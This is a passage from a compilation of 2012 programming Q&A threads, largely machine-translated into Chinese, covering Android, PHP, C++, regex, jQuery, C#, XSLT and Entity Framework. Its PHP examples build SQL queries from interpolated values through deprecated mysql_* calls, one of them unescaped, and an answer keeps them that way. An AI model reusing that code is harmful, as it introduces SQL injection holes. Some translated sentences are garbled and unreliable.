When the display is big my tabs stay inside of sherlock action bar.

In my style, everything is blue, i haven't any idea about this black on the selected tab and dividers.

See a print with my problem: [http://www.fileupyours.com/files/321626/outro%20problema.png](http://www.fileupyours.com/files/321626/outro%20problema.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-28T12:37:50.083

我解决了这个问题。问题出在一位父母身上`.Solid.Inverse`，我删除并`strange black color`消失了。

前：

```
parent="Widget.Sherlock.Light.ActionBar.Solid.Inverse" 
```

后：

```
parent="Widget.Sherlock.Light.ActionBar" 
```

# java - 如何从我的活动线程修改适配器中的行？

> ID：12146662
> 
> 赞同：0
> 
> 时间：2012-08-27T17:31:12.357
> 
> 标签：java, android, android-listview, android-adapter

我`ListView`参与了我的活动。单击按钮后，将`AynscTask`调用 an ，完成后将 a 附加`BaseAdapter`到`ListView`it's`onPostExcecuteMethod`以显示结果：

```
protected void onPostExecute(ArrayList<Result> objResults) {
    ListView lvwResults = (ListView) objContext.findViewById(R.id.results);
    lvwResults.setAdapter(new SearchResultsAdapter(this.objContext, objResults));       
} 
```

适配器在一个非常简化的注释上看起来像这样：

```
public class SearchResultsAdapter extends BaseAdapter {    
    private static ArrayList<Result> objResults;
    private Search ctxContext = null;

    public SearchResultsAdapter(Search ctxContext, ArrayList<Result> objResults) {
        this.ctxContext = ctxContext;
        SearchResultsAdapter.objResults = objResults;
    }

    public View getView(int position, View convertView, ViewGroup parent) {
        LayoutInflater mInflater = LayoutInflater.from(ctxContext);
        View vewRow = mInflater.inflate(R.layout.row, null);
        TextView tvwName = (TextView) vewRow.findViewById(R.id.name);
        tvwName.setText(objResults.get(position).getName());
        return vewRow;
    }
} 
```

从我的主要活动（即最初`Activity`调用. 我怎样才能做到这一点？`AsyncTask``SearchResultsAdapter`

由于我似乎无权访问适配器实例，如何从我的主 UI 线程访问适配器行？我还读了一些关于打电话`notifyDatasetChanged()`的东西？

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-27T19:15:42.750

通常，您会保留您尝试对适配器上的方法执行的排序。然后从 Main Activity 调用适配器的方法（创建时保存适配器实例）。

完成后不要忘记在适配器方法上调用 notifyDataSetChanged/Invalidated。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-27T21:51:03.337

在启动 AsyncTask 之前创建一个带有空数组列表的适配器。在后期执行中，将结果添加到用于初始化适配器的空数组列表中。在适配器上调用 notifyDataSetChanged()。

您可以通过 ListView 的 getAdapter() 方法访问适配器，也可以使适配器成为成员变量。

# php - Should I use static method and properties to detect the language and translate text?

> ID：12146669
> 
> 赞同：4
> 
> 时间：2012-08-27T17:31:36.173
> 
> 标签：php, oop, class, static

## Choices

I am learning OOP PHP, but some things are really confusing. I have a general idea of where to use static methods, but I'm not sure if here it's a good idea.

My questions is about which is actually the best approach for the specific problem I am facing (described below). The general guidelines I've found online didn't help for this specific problem. Here is what I thought (from more likely to be correct to less):

*   Extend the Language class, create a single object (that gets the language in the initialization) and call a method with the $id that would return the translated string.

*   Merge both classes into one. The language would be found when initialized and a method called when needed. But it would behave a little as a [God object](http://en.wikipedia.org/wiki/God_object).

*   Make the Language class static. Therefore I would be able to use it from within the Text. I would create a Text instance and call a method with different $id. Similar to using it with globals. There's almost no other place where I'd need to use the Language class.

*   Extend the Language class with Text, create an object for each translation. This would probably create too much overhead.

*   Not do anything. It's tempting (don't fix it if it's not broken), but I intend to start developing with someone else soon, so clean and clear code is needed.

## Code

Now the simple class:

```
class Language
  {
  public $Lang;
  public function __construct()
    {
    if ( !empty($_POST['lang']) )    // If the user tries to change the language
      {
      $this->Lang = mysql_real_escape_string($_POST['lang']);  // Assign the language to variable.
      $_SESSION['lang'] = $this->Lang;      //Sets the session to have that language.
      if ($_SESSION['logged']==1)          // If user is logged
        {
        $User=$_SESSION['user'];
        mysql_query("UPDATE users SET lang='$this->Lang' WHERE email='$User'") or die(mysql_error());  // Saves the language into user preferences
        }
      }
    else      // If no request is done.
      {
      if ($_SESSION['logged']==1)    // DO. Check for user's language
        {
        $User=mysql_real_escape_string($_SESSION['user']);
        $result=mysql_query("SELECT * FROM users WHERE email='$User'");
        $row=mysql_fetch_array($result);
        $this->Lang=$row['lang'];
        }
      else
        if ( !empty ($_SESSION['lang']))  // If the session exists (not empty)
          $this->Lang = $_SESSION['lang'];  // Assign the session language to variable.
        else          // If it doesn't exist
          $this->Lang = substr ($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);  // Get it from the browser
      }
    //If the language is not supported (or still doesn't exist), then put "en" as default. Supported so far: en, es.
    if ( $this->Lang !== "en" && $this->Lang !== "es") $this->Lang="en";
    }
  } 
```

I have few methods inside this class, but that's the only relevan code here. So I initialize it with `$Language=new Language;` and then use `$Language->Lang;` to obtain the user language. So far so good.

This is the function I want to reconvert to a class. It gets an integer or a string, searches it as an id with mysql and returns a translated string in the right language. Now, how do I achieve this? Here it's the text() function. It was used with globals, which is apparently a really bad practice.

```
function text($Id)
    {
    // Already defined and tested that are valid (sql injection avoided also)
    global $Lang;
    global $Url;
    global $Version;
    global $Banner;
    if (!empty($Url["folder"])) $FullUrl = "/".$Url["folder"]."/";
      else $FullUrl="/";
    if (!is_int($Id)) $Id = mysql_real_escape_string( $Id );

    $numargs = func_num_args();  // Get the number of arguments that are being passed.
    if ($numargs == 2)  // If there are actually two
      $Var=func_get_arg(1);  // Set $Var with the second value (1).

    if (is_int($Id))  // If a number is being passed
      {
        // Add AND page='$FullUrl' to control scope of the strings translated
      $results = mysql_query("SELECT * FROM translations WHERE id='$Id'") or die ('Could not query:' . mysql_error());
      $row = mysql_fetch_assoc($results);
      if (!empty($row[$Lang]) && !isset($Var)) echo stripslashes($row[$Lang]);  // If there is some, echo it
        elseif ($Var==1) return stripslashes($row[$Lang]); // If it is required to be a returned string, send it.
      else error($FullUrl,$Lang);  // If there is nothing there, calls error function.
      }
    else  // If a string is being passed
      {
      $results = mysql_query("SELECT * FROM htranslations WHERE keyword='$Id'") or die ('Could not query:' . mysql_error());
      $row = mysql_fetch_assoc($results);

      if (!empty($row[$Lang]) && !isset($Var)) echo stripslashes($row[$Lang]);  // If it exists in the table, echo it
      elseif (!empty($row[$Lang]) && isset($Var)) return stripslashes($row[$Lang]);
      else  // Else (it doesn't exist)
        {
        $Id = str_replace("_", " ", $Id);  // Replace the "_" with " "
        if (!isset($Var))
          {
          echo $Id;  // Echo the passed string with spaces
          }
        else return $Id;

        $Banner="There might be some misstranslation. Please report if needed.";
        }
      }
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-01T14:42:01.547

所以 text 函数有很多副作用；意思是，它涉及很多东西，有时会返回，有时会打印到标准输出。这通常不好，因为它很难调试、单元测试和重构

我会选择选项 2：将两个类合并为一个。初始化时会找到该语言，并在需要时调用一个方法。

下面是我将如何实现这一点（我尽可能多地保持代码完整，以便您了解 OOP 方面发生了什么变化。还有很多其他的事情我会改变；主要是其他人已经评论过的内容以及不从内部打印任何内容方法。让方法返回一些东西而不是从内部修改应用程序状态是一种很好的做法

我改变的事情：

文本函数实际上在特定时间更改了一个全局变量 ($Banner)，使用两个全局变量 ($Url) 和 ($Lang 它实际上来自语言对象) 然后从数据库返回一个 Id 或可能打印到标准输出。

由于将文本函数移到 Language 类中，我将全局 $Lang 变量转换为使用 Language 类的实例变量 $Lang

$Url 方法仅在 text 函数中使用，因此可以传递给 text 方法

全局变量 $Banner 实际上是由我认为不好的副作用的文本函数设置的。我决定替换这段代码：

$Banner = "可能有一些翻译错误。如果需要请报告。";

和

返回假。

这样，如果 text 方法返回 false，您可以将 $Banner 变量设置为“可能有一些误译。如果需要，请报告。” 这是从对象外部完成的。

另外，我从文本函数中删除了全局变量 $Version，因为它没有在函数中使用

我还建议让 text 方法只返回而不打印到标准输出。错译拼写错误。应该是误译。

我希望这有帮助...

```
<?php

class Language {

    public $Lang;

    public function __construct() {
        if (!empty($_POST['lang'])) {    // If the user tries to change the language
            $this->Lang = mysql_real_escape_string($_POST['lang']);  // Assign the language to variable.
            $_SESSION['lang'] = $this->Lang;      //Sets the session to have that language.
            if ($_SESSION['logged'] == 1) {          // If user is logged
                $User = $_SESSION['user'];
                mysql_query("UPDATE users SET lang='$this->Lang' WHERE email='$User'") or die(mysql_error());  // Saves the language into user preferences
            }
        } else {      // If no request is done.
            if ($_SESSION['logged'] == 1) {    // DO. Check for user's language
                $User = mysql_real_escape_string($_SESSION['user']);
                $result = mysql_query("SELECT * FROM users WHERE email='$User'");
                $row = mysql_fetch_array($result);
                $this->Lang = $row['lang'];
            } else
            if (!empty($_SESSION['lang']))  // If the session exists (not empty)
                $this->Lang = $_SESSION['lang'];  // Assign the session language to variable.
            else          // If it doesn't exist
                $this->Lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);  // Get it from the browser
        }
        //If the language is not supported (or still doesn't exist), then put "en" as default. Supported so far: en, es.
        if ($this->Lang !== "en" && $this->Lang !== "es")
            $this->Lang = "en";
    }

    public function text($Id, $Url) {
        // Already defined and tested that are valid (sql injection avoided also)
        if (!empty($Url["folder"]))
            $FullUrl = "/" . $Url["folder"] . "/";
        else
            $FullUrl = "/";
        if (!is_int($Id))
            $Id = mysql_real_escape_string($Id);

        $numargs = func_num_args();  // Get the number of arguments that are being passed.
        if ($numargs == 2)  // If there are actually two
            $Var = func_get_arg(1);  // Set $Var with the second value (1).

        if (is_int($Id)) {  // If a number is being passed
            // Add AND page='$FullUrl' to control scope of the strings translated
            $results = mysql_query("SELECT * FROM translations WHERE id='$Id'") or die('Could not query:' . mysql_error());
            $row = mysql_fetch_assoc($results);
            if (!empty($row[$this->Lang]) && !isset($Var)) {
                echo stripslashes($row[$this->Lang]);  // If there is some, echo it
            } elseif ($Var == 1) {
                return stripslashes($row[$this->Lang]); // If it is required to be a returned string, send it.
            } else {
                error($FullUrl, $this->Lang);  // If there is nothing there, calls error function.
            }
        } else {  // If a string is being passed
            $results = mysql_query("SELECT * FROM htranslations WHERE keyword='$Id'") or die('Could not query:' . mysql_error());
            $row = mysql_fetch_assoc($results);

            if (!empty($row[$this->Lang]) && !isset($Var)) {
                echo stripslashes($row[$this->Lang]);  // If it exists in the table, echo it
            } elseif (!empty($row[$this->Lang]) && isset($Var)) {
                return stripslashes($row[$this->Lang]);
            } else {  // Else (it doesn't exist)
                $Id = str_replace("_", " ", $Id);  // Replace the "_" with " "
                if (!isset($Var)) {
                    echo $Id;  // Echo the passed string with spaces
                } else {
                    return $Id;
                }

                return false;
            }
        }
    }

}

?> 
```

# c++ - Double inheritance :

> ID：12146670
> 
> 赞同：0
> 
> 时间：2012-08-27T17:31:36.870
> 
> 标签：c++, inheritance, multiple-inheritance

My questions are related to the following structure : ![enter image description here](../Images/fdb05874f43bf389560d171d76e79231.png)

The abstract levels are just here to provide the member function for the "real" classes (D1 and D2). As it needs to be highly optimized, there is no virtuality (the destructors of the abstract levels are protected). Is the part with B0-C1-C2-D1 perfectly ok in the following cases :

1.  B0, C1 and C2 have members function with different names ?

2.  C1 and C2 have a function with the same name (for example `myFunction`) ?

3.  C1 and C2 and D1 have a function with the same name (for example `myFunction`) ?

4.  B0 and C2 have a function with the same name but not C1 (for example `myFunction`) ?

In each case what version of the function will be called by D1 ?

EDIT : a quick piece of code to illustrate that :

```
template<class CRTP> class A0
{
    public:
        void myfunction1();
    protected:
        ~A0();
        double mymember;
};

template<class CRTP> class B0 : public A0<CRTP>
{
    public:
        void myfunction2();
    protected:
        ~B0();
};

template<class CRTP> class C1 : public B0<CRTP>
{
    public:
        void myfunction3();
    protected:
        ~C1();
};

template<class CRTP> class C2 : public B0<CRTP>
{
    public:
        void myfunction4();
    protected:
        ~C2();
};

class D1 : public C1<D1>, public C2<D1>
{
    public:
        void myfunction5();
}; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-27T18:11:05.693

“完全可以”有点主观，但所有情况在语言中都有很好的定义。

您可能[会](http://www.parashift.com/c++-faq/mi-diamond.html)在`D1`. *如果合适的*话，你可以使用[虚拟继承](http://www.parashift.com/c++-faq/virtual-inheritance-where.html)来拥有`C1`和`C2`继承一个共同的基础。这并不总是合适的，我们很难猜测。

1)

它们是具有不同方法的不同类，没有冲突。

2)

`C1`或内没有问题`C2`，但`D1`会有问题。

3)

您*必须*在`D1`. 继承`myFunction`的调用将从外部隐藏（无法访问）。您可以像这样从 D1 中调用它们：

```
struct D1 {
  void myFunction() {
    C1::myFunction();
    C2::myFunction();
  }
} 
```

使用 CRTP 会很烦人。我建议在类定义中使用 typedefs 来保持你的理智。

4)

`C1`将具有`B0`赋予它的任何功能。如果它们不可访问，那么在引用它们时会出现编译器错误。

老实说，我建议不要使用这种设计。将所有东西分解成小的具体物体并组合它们。维护这不是一个项目，而是一个职业。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-27T18:50:36.560

我不会说没关系，除非你可以接受`A0`和`B0`两次在你的班级，尽管他们是不同的班级（`B0<C1>`和`B0<C2>`）。除非您正在做一些专业化，否则这很可能[不是您想要](http://ideone.com/12qdv)的。

一个可能的解决方案是[这样](http://ideone.com/6ZBMa)的，它删除了多重继承：

```
template<class CRTP, class Base = B0<CRTP> > class C1 : public Base
{
    public:
        void myfunction3();
    protected:
        ~C1();
};

template<class CRTP, class Base = B0<CRTP> > class C2 : public Base
{
    public:
        void myfunction4();
    protected:
        ~C2();
};

class D1 : public C2<D1,C1<D1>>
{
    public:
        void myfunction5();
}; 
```

那么，如果您确实想在其中拥有那颗钻石怎么办，您可以在没有多个基类实例的情况下做到吗？
不，因为
a）正如我所说的基类是不同的，并且
b）在C ++虚拟继承中只适用于具有vtable的类。

# php - RegExp - How to return a single row of answers instead of multiple rows of answers

> ID：12146671
> 
> 赞同：0
> 
> 时间：2012-08-27T17:31:37.570
> 
> 标签：php, javascript, regex

I have a RegExp

```
/h.*e.*l.*l.*o.*/i 
```

And I have my paragraph that its being run on.

```
Hey look at that lion! 
```

The result is this:

```
answer[0] = Hey look at that lion!
answer[1] = H
answer[2] = e
answer[3] = l
answer[4] = l
answer[5] = o 
```

I was wondering if I could get a result like this:

```
answer[0] = Hey look at that lion!
answer[1] = Hello 
```

by **only** changing my RegExp. Maybe using grouping or something? And if the answer to that question is no, then what are my other options? I really don't want to loop over the answer and string it together either, but if that's the only way then I will do it like that I suppose.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T17:36:03.383

你的表情很好。您只需执行一次并返回一个匹配项。没关系。

在这里查看参考：[http ://regex101.com/r/jU3zU2](http://regex101.com/r/jU3zU2)

如果您愿意，您可以像我在示例中那样使用反向引用来获取整个数据。

但是，您想返回“你好”，这就是您在正则表达式中所拥有的......所以呃..什么？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-27T18:12:28.923

使用正则表达式是不可能的。使用正则表达式时不可更改的规则之一是每个字符只能匹配*一次*。这意味着您不能返回整个句子*和*其中的某些部分。

例子：

```
"abc".match(/a|b|c|(abc)/g) 
```

最后一`abc`组，虽然它会匹配，但永远不会匹配，因为 abc 的字符匹配前面的表达式`a|b|c`

我不知道你想通过在正则表达式中对结果进行硬编码来实现什么，我假设你的*真实*代码应该做其他事情。如果没有，只需将“hello”分配给一个变量。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-27T17:35:53.460

```
array_shift($answer);
$answer = implode('',$answer); 
```

array_shift 将从结果数组中删除包含整个字符串的元素，然后 implode 会将它们全部组合成一个字符串。

# javascript - 如何通过由另一个方法填充的方法访问对象的成员？

> ID：12146680
> 
> 赞同：1
> 
> 时间：2012-08-27T17:32:17.567
> 
> 标签：javascript, jquery

我知道标题有点混乱，这里是详细信息：

假设我在 javascript 中定义了一个自定义对象，并且其中定义了一个公共成员：

```
 function Test()
 {
   this.testArray = [];
 } 
```

我对这个对象有两种方法，一种是读出一些 xml 文件并填充到数组中：

```
 Test.prototype.readXML = function()
 {
   var self = this;
   $.get('assest/xml/mydata.xml', function(d){
    $(d).find("item").each(function(){
            var item = new Item;
            item.ID = ($(this).attr("ID"));
            item.body = ($(this).find("body").text());
            });
     self.testArray.push(item);
   });
   } 
```

还有另一个函数，它将内容显示到 HTML 页面中。

```
 Test.prototype.appendInfo = function()
  {
     var i;
     for (i=0; i<testArray.length;i++)
     {
       $('#testdisplay').append(testArray[i].ID +"<br />");
       $('#testdisplay').append(testArray[i].body = "<br /");
      }
   } 
```

但是，显示功能继续给我错误，即未定义 testArray。我不确定问题出在哪里，因为我把显示功能放在阅读功能后面。我希望数据将存储在数组中，并且可以在需要时随时访问。

希望有人能帮我解决这个问题！谢谢！} }

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-27T17:42:30.517

所以我注意到你的代码有两个问题。

首先，当您进行 ajax 调用时，您需要将延迟传回给用户。由于 ajax 调用是异步的，它可能不会立即完成。

所以你的 readXML 函数应该这样做。它应该返回 jquery get。

```
Test.prototype.readXML = function() {
   var self = this;
   return $.get('assest/xml/mydata.xml', function(d){
        $(d).find("item").each(function(){
            var item = new Item;
            item.ID = ($(this).attr("ID"));
            item.body = ($(this).find("body").text());
        });
        self.testArray.push(item);
   });
} 
```

接下来，您的第二个函数 append 只是缺少一些上下文。

```
Test.prototype.appendInfo = function() {
    var i;
    for (i=0; i<this.testArray.length;i++) {
       $('#testdisplay').append(this.testArray[i].ID +"<br />");
       $('#testdisplay').append(this.testArray[i].body = "<br /");
    }
} 
```

所以你的代码应该是这样的。

```
var mytest = new Test();

mytest.readXML().done(function(){
    mytest.appendInfo();
}).fail(function(){
    // put some fallback code here
}); 
```

更新：添加了额外的这个。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-27T17:48:50.290

`testArray`你的函数中没有`appendInfo()`，这就是为什么它说它没有定义。你应该`this.testArray`改用。

每次你想使用*在你的作用域内声明*的变量，但在你正在使用*的函数之外*，你必须使用`this.yourVariable`

# jquery - 在每个 jQuery Fullcalendar 框架中显示杂项 Ajax 数据

> ID：12146681
> 
> 赞同：0
> 
> 时间：2012-08-27T17:32:20.423
> 
> 标签：jquery, ajax, events, fullcalendar

我实际上正在将 jQuery fullCalendar 用于预订系统，并且我正在寻找一种方法来将一些杂项信息显示到从**日期**（基本上是当前日期）到另一个**日期**（当前日历视图的最后一天）的每一天框架中）。

更清楚地说，我的日历显示一个月中的每一天，我想通过 Ajax 查询从 MySQL 数据库中获取一些信息，比如未来几天的空闲槽数等......

例子：

从 27-08-2012（今天）开始，MySQL 将从 Ajax 查询返回从今天到当前视图的最后一天的每一天的空闲槽数，这仅适用于每周视图。数据应在周更改时更新。

有关信息，从 Ajax 调用返回的数据可能是 pliants。

任何帮助或想法将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-03T12:08:16.800

我终于设法解决了这个问题。这可能不是最好的解决方案，但它有效......

首先，我为日历使用 2 个事件源：

```
eventSources: [
        "events_list.php",
        "free_slots.php"
    ] 
```

它们都返回具有**不同 css 属性的**事件。第一个为 EventType，第二个为 EventInfo。我知道我可以使用相同的文件，但由于某些原因，这是不可能的......

因此，第一个从 SQL 查询中检索每个事件。第二个使用 jQuery fullCalendar 插件使用的 2 个变量：

```
$_GET['start'];
$_GET['end']; 
```

然后我只需要做一些计算来检索这两个日期之间的所有事件以及每个事件的可用插槽数......

服务器端脚本返回一个带有“className”选项的 JSON 数组...（+如果需要，空闲槽的数量（取决于使用的 .php 文件））

```
$Arrayz[] = array('className' => 'EventInfo'); echo json_encode($Arrayz); 
```

所以每个事件的空闲插槽都像事件一样显示，但它们并不是真的......（没有背景颜色，没有边框等......）

之后，我还可以使用 fullCalendar 插件的另一个功能，让用户与真实事件进行交互......

```
eventClick: function(event) {
   if(event.className == 'EventType'){ etc... 
```

可能性是无限的……

希望它会有所帮助。

# c# - 在 Windows 上运行 C# 应用程序

> ID：12146683
> 
> 赞同：7
> 
> 时间：2012-08-27T17:32:27.500
> 
> 标签：c#, visual-studio-2010, windows-installer

我正在尝试仅在 Windows 启动时为当前用户启动一些应用程序。

我可以通过以下方式完成此操作：

```
RegistryKey oKey = Registry.CurrentUser.OpenSubKey("Software", true);
oKey = oKey.OpenSubKey("Microsoft", true);
oKey = oKey.OpenSubKey("Windows", true);
oKey = oKey.OpenSubKey("CurrentVersion", true);
oKey = oKey.OpenSubKey("Run", true);
oKey.SetValue("Application 1", "C:\\path\\to\\ap1.exe");
oKey.SetValue("Application 2", "C:\\path\\to\\ap2.exe"); 
```

但我试图将其作为 Visual Studio 安装程序项目的一部分运行。我添加了我的自定义操作，程序正常启动，安装程序在 XP 中运行良好。

在 Windows 7 中，安装程序获得了提升的权限，并且除了将条目插入到当前用户的注册表之外，它会执行所有操作。但是，它在作为独立应用程序（在安装程序项目之外）运行时会插入注册表项，并且不会获得提升的权限。

我唯一能想到的是，使用提升的权限，它试图将条目插入管理员帐户而不是当前用户？还是我还缺少其他东西？还有另一种方法可以在这里实现我的目标吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-27T18:54:44.513

是否有理由不为用户使用启动文件夹？

问题很可能是安装程序在其下执行的用户。如果用户不是管理员，提升的安装程序将在提升进程的用户的上下文中运行。

将应用程序添加到启动文件夹或在首次启动时添加注册表项将是更安全的选择。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-27T18:41:04.617

如果安装程序正在获得提升的权限，为什么要将设置写入 HKCU？而是将其写入 HKLM。然后它将对所有用户生效。

# android - 在 Android 上缩放网站

> ID：12146686
> 
> 赞同：1
> 
> 时间：2012-08-27T17:32:35.863
> 
> 标签：android, html

[我的网站](http://iqhomeautomation.com/)在 iPhone 上看起来很棒，但在 Android 上放大了。我在标题中有标准的设备宽度代码（我已经在我做过的所有网站上都使用了它，它们看起来很好）但是由于某种原因这在 Android 上不起作用，并且网站似乎被放大了在。

```
<meta name="viewport" content="width=device-width" /> 
```

我希望它看起来像它在 iPhone 上的样子。因此，当它加载时，您可以看到整个宽度。

![在此处输入图像描述](../Images/d3cc0b6b50902245e312ba526f65af84.png)

像这里这样。

然而在android上它会这样做......

![在此处输入图像描述](../Images/a5354f1d6fc5bd7398651df829d5b1ae.png)

任何人都对为什么它在 Android 上放大以及如何修复这个奇怪的调整有建议。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-27T17:35:52.043

尝试将宽度设置为您网站的实际宽度，而不是设备的宽度。

例如：

```
<meta name="viewport" content="width=980"> 
```

另外，我建议你买一本关于 HTML/CSS 的好书，然后按照自己的方式学习。

编辑：[O'Reilly 的“Head First”HTML 和 CSS](http://www.amazon.co.uk/Head-First-HTML-Elisabeth-Robson/dp/0596159900)非常容易*理解*，但也会为您提供坚实的基础。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-27T17:47:40.647

试试这个：

```
<meta name="MobileOptimized" content="320"> 
```

除了你的

```
<meta name="viewport" content="width=device-width"> 
```

（或将 320 更改为任何有意义的值）

这是一个工作示例，您可以查看其源代码：

[http://m.qrdroid.com](http://m.qrdroid.com)

# xml - 在 XSLT 中创建地图

> ID：12146687
> 
> 赞同：2
> 
> 时间：2012-08-27T17:32:44.700
> 
> 标签：xml, xslt, xslt-1.0, saxon

```
<xsl:variable name="map">
   <map>
        <item key="Name" value="John"/>
        <item key="Address" value="Un_Known"/>
        <item key="Phone" value="(878)876678"/>
        <item key="Last Name" value="Verner"/>
    </map>
</xsl:variable>

<xsl:for-each select "$map/map/item">
   <xsl:if test="./@key = $input">
      <!-- cool user is asking for something know .. do something fancy -->
   </xsl:if>
<xsl:for-each> 
```

我想在我的 XSLT 中声明一个类似映射的结构，然后想要访问它。显然，我不想使用额外的名称空间，所以使用 exsl:node-set 不是我现在正在寻找的解决方案。

我正在使用 XSLT 1.0 Saxon。

有没有更好的方法来做我想做的事情？

谢谢卡勒菲尔

* * *

下面提到的所有答案都是正确和有效的。我们最终决定使用“exsl:node-set”

## 谢谢你的建议..

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-28T08:25:13.883

If you are using Saxon, then it is very hard to see why you are still using XSLT 1.0\. This kind of thing (and many other things) are much easier in XSLT 2.0 - it's time you moved forward.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-28T12:13:07.683

你得到了三个非常好的答案。

**这是另一个，它演示了如何使用键来访问查找表**（在实际情况下，它会驻留在单独的 XML 文档中）：

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
 xmlns:my="my:my" exclude-result-prefixes="my">
 <xsl:output omit-xml-declaration="yes" indent="yes"/>

 <xsl:param name="pInput" select="'Phone'"/>
   <my:map>
        <item key="Name" value="John"/>
        <item key="Address" value="Un_Known"/>
        <item key="Phone" value="(878)876678"/>
        <item key="Last Name" value="Verner"/>
    </my:map>

 <xsl:key name="kLookup" match="item/@value" use="../@key"/>

 <xsl:template match="/">
     <xsl:for-each select="document('')">
       <xsl:value-of select="key('kLookup', $pInput)"/>
     </xsl:for-each>
 </xsl:template>
</xsl:stylesheet> 
```

**当将此转换应用于任何 XML 文档（未使用）时，将产生所需的正确结果**：

```
(878)876678 
```

* * *

**在 XSLT 2.0 中`xsl:for-each`不需要**，因为该**[`key()`](http://www.w3.org/TR/xslt20/#function-key)**函数接受指定要索引的文档的第三个参数：

```
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
 xmlns:my="my:my" exclude-result-prefixes="my">
 <xsl:output omit-xml-declaration="yes" indent="yes"/>

 <xsl:param name="pInput" select="'Phone'"/>
   <my:map>
        <item key="Name" value="John"/>
        <item key="Address" value="Un_Known"/>
        <item key="Phone" value="(878)876678"/>
        <item key="Last Name" value="Verner"/>
    </my:map>

 <xsl:key name="kLookup" match="item/@value" use="../@key"/>

 <xsl:template match="/">
       <xsl:value-of select="key('kLookup', $pInput, document(''))"/>
 </xsl:template>
</xsl:stylesheet> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-27T19:28:24.653

如果您不想使用`node-set()`扩展功能，可以将`<map>`数据放在单独的 XML 文件中，例如`map.xml`. 然后使用`document('map.xml')`. 然后，您可以使用 XPath 表达式访问映射的内容，如上所示。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-28T01:50:43.783

您可以包含额外的 XML 信息，例如`<map>`直接在 XSLT 中。该 XML 数据需要绑定到名称空间（XSLT 名称空间除外），但它可以是任何名称空间。

您可以通过使用`document()`带有空字符串的函数来访问 XSLT 中的数据，这将加载 XSLT 文档。

顺便说一句，您可以通过在您选择`<xsl:if>`的 XPath 上使用谓词过滤器来消除对 的需要。`xsl:for-each`

例如：

```
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
    version="1.0"
    xmlns:my="http://stackoverflow.com/questions/12146687/creating-a-map-in-xlst">

    <xsl:param name="input" />

    <my:map >
        <item key="Name" value="John"/>
        <item key="Address" value="Un_Known"/>
        <item key="Phone" value="(878)876678"/>
        <item key="Last Name" value="Verner"/>
    </my:map>

    <xsl:template match="/">
        <xsl:for-each select="document('')/*/my:map/item[@key=$input]">
                <!-- cool user is asking for something know .. do something fancy -->
        </xsl:for-each>
    </xsl:template>

</xsl:stylesheet> 
```

# entity-framework - 当我只想要一个返回时，EntityFramework 4 返回所有列

> ID：12146693
> 
> 赞同：3
> 
> 时间：2012-08-27T17:33:29.040
> 
> 标签：entity-framework, entity-framework-4, ef-code-first

我不明白为什么 entityframework 会返回以下两个查询中的所有列。我试图让它只返回日期列，但返回 db.EmailDetails 的所有列，当我查看生成的 sql 时（发布在下面）

```
var y = (from data1 in db.EmailDetails
                             join data2 in db.AddressBookEntries on data1.FromAddressBookEntryId equals data2.Id
                             orderby data1.EmailSendFinishTime descending 
                             select data1.EmailSendFinishTime).FirstOrDefault();

var x =
                        db.EmailDetails.Where(a => a.User.Username == username && a.FromAddressBookEntry.WhiteList).
                            Select(a => new
                                            {
                                                a.EmailSendFinishTime
                                            }).
                            OrderByDescending(
                                a => a.EmailSendFinishTime)
                            .FirstOrDefault(); 
```

生成的sql：

```
 exec sp_executesql N'SELECT TOP (1) 
            [Project1].[Id] AS [Id], 
            [Project1].[UserId] AS [UserId], 
            [Project1].[InValidMailMessage] AS [InValidMailMessage], 
            [Project1].[MailInternalDate] AS [MailInternalDate], 
            [Project1].[MessageUniqueId] AS [MessageUniqueId], 
            [Project1].[FromAddressBookEntryId] AS [FromAddressBookEntryId], 
            [Project1].[ToEmailAddress] AS [ToEmailAddress], 
            [Project1].[EmailFolderId] AS [EmailFolderId], 
            [Project1].[EmailHeaderInfo] AS [EmailHeaderInfo], 
            [Project1].[EmailSendSmtpServer] AS [EmailSendSmtpServer], 
            [Project1].[EmailSendStatus] AS [EmailSendStatus], 
            [Project1].[EmailSendStartTime] AS [EmailSendStartTime], 
            [Project1].[EmailSendFinishTime] AS [EmailSendFinishTime], 
            [Project1].[EmailSendLogMessage] AS [EmailSendLogMessage], 
            [Project1].[Subject] AS [Subject], 
            [Project1].[MimeMessageFull] AS [MimeMessageFull], 
            [Project1].[HighPriority] AS [HighPriority], 
            [Project1].[SentDateTime] AS [SentDateTime], 
            [Project1].[EmailDeleted] AS [EmailDeleted], 
            [Project1].[EmailDeletedDateTime] AS [EmailDeletedDateTime], 
            [Project1].[EmailViewed] AS [EmailViewed], 
            [Project1].[EmailViewedDateTime] AS [EmailViewedDateTime], 
            [Project1].[BodyTextForSend] AS [BodyTextForSend], 
            [Project1].[ReceivedDate] AS [ReceivedDate]
            FROM ( SELECT [Extent1].[Id] AS [Id],
                          [Extent1].[UserId] AS [UserId],
                          [Extent1].[InValidMailMessage] AS [InValidMailMessage],
                          [Extent1].[MailInternalDate] AS [MailInternalDate],
